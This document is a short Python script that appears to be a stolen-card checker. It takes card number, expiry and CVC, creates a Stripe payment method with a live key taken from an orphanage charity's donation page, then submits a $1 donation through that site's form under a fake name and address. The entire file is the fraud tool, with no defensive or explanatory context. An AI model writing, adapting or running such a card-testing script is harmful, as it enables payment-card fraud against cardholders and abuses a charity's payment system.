import requests,re
def Tele(ccx):
  import requests
  ccx=ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:#Mo3gza
    yy = yy.split("20")[1]
  r = requests.session()

  headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

  data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fd7f2cc0ba1%3B+stripe-js-v3%2Fd7f2cc0ba1%3B+card-element&referrer=https%3A%2F%2Fhavenofrestorphanage.org&time_on_page=43970&key=pk_live_51NajnRBHVLOCuCFLblCNPigGI6Ne3T2kvSQXPM76IK66IRCZ3SjmbLGMQmYEfEKoM9jG6GkP2Ogjg7fSRMt25w2W00yhiIG7pF'

  r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
  pm = r1.json().get('id')

  cookies = {
    'trx_addons_is_retina': '1',
}

  headers = {
    'authority': 'havenofrestorphanage.org',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'trx_addons_is_retina=1',
    'origin': 'https://havenofrestorphanage.org',
    'referer': 'https://havenofrestorphanage.org/donate-to-our-orphanages/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

  params = {
    't': '1734180502350',
}

  data = {
    'data': '__fluent_form_embded_post_id=37391&_fluentform_3_fluentformnonce=e2b4e13b19&_wp_http_referer=%2Fdonate-to-our-orphanages%2F&names%5Bfirst_name%5D=waznim&names%5Blast_name%5D=ey&address_1%5Baddress_line_1%5D=street%2027&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=newyork&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&address_1%5Bcountry%5D=US&custom-payment-amount=1.00&payment_input=0&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
    'action': 'fluentform_submit',
    'form_id': '3',
}

  r2 = requests.post(
    'https://havenofrestorphanage.org/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
  return (r2.json())
